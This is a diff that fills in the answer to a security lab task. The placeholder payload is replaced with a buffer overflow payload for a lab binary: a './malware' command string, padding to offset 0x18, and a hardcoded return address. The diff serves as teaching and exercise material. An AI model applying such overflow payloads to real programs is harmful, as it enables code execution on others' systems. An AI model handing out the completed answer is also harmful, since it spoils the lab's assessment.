@@ -1,10 +1,7 @@
-#!/usr/bin/env python3
-"""Task 1: build the payload for attack/dark-calc.
+import sys, struct
 
-TODO: replace the empty payload with the bytes required by the lab.
-"""
-import sys
-
-payload = b""
+payload  = b"./malware\x00"
+payload += b"A" * (0x18 - len(payload))
+payload += struct.pack("<Q", 0x401a6b)
 
 sys.stdout.buffer.write(payload)
